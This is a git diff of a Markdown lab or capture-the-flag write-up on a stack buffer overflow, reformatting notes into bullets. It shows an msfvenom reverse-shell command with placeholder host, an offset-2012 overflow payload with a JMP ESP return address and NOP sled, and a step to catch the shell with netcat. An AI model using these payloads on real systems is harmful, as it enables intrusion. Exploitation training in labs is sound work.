@@ -436,44 +436,34 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -b "\x00
 ```
 
 ### Earlier tests with EIP offset 2012 and replacement of location at EIP
+
 When you use:
 
 message = b"A"*2012 + b"BBBB" + b"\x90" * 20
-Saved return address = BBBB
-
-On RET, CPU tries to jump to 0x42424242
-
-That’s invalid → immediate crash
-
-Immunity shows:
-EIP = 0x42424242
+- Saved return address = BBBB
+- On RET, CPU tries to jump to 0x42424242
+- That’s invalid → immediate crash
+- Immunity shows: EIP = 0x42424242
 
 As expected
 
 When you use:
 
-python
 message = b"A"*2012 + b"\xdf\x14\x50\x62" + b"\x90" * 20
-Saved return address = 0x625014DF (you see this on the stack where BBBB used to be)
-
-On RET, CPU loads EIP = 0x625014DF
-
-That instruction is JMP ESP
-
-So execution immediately jumps to whatever ESP points to → the start of your NOP sled
-
-Now Immunity shows:
-EIP = 0x008AF6B3 (or similar) — an address inside your NOP sled
+- Saved return address = 0x625014DF (you see this on the stack where BBBB used to be)
+- On RET, CPU loads EIP = 0x625014DF
+- That instruction is JMP ESP
+- So execution immediately jumps to whatever ESP points to → the start of your NOP sled
+- Now Immunity shows: EIP = 0x008AF6B3 (or similar) — an address inside your NOP sled
 
 So:
 
-0x625014DF on the stack where BBBB was → saved EIP is correctly overwritten
-
-EIP pointing into the NOP sled → the JMP ESP has already fired and you now control execution flow
+- 0x625014DF on the stack where BBBB was → saved EIP is correctly overwritten
+- EIP pointing into the NOP sled → the JMP ESP has already fired and you now control execution flow
 
 That’s exactly what you want. Now we add shellcode to payload section and start netcat listener to catch the shell.
 
-### Q After gaining access, what is the content of the root.txt file?
+### Q5 After gaining access, what is the content of the root.txt file?
 Incorporate the payload from msfvenom into script above to connect with a netcat listener and then search for root.txt.
 
 ```
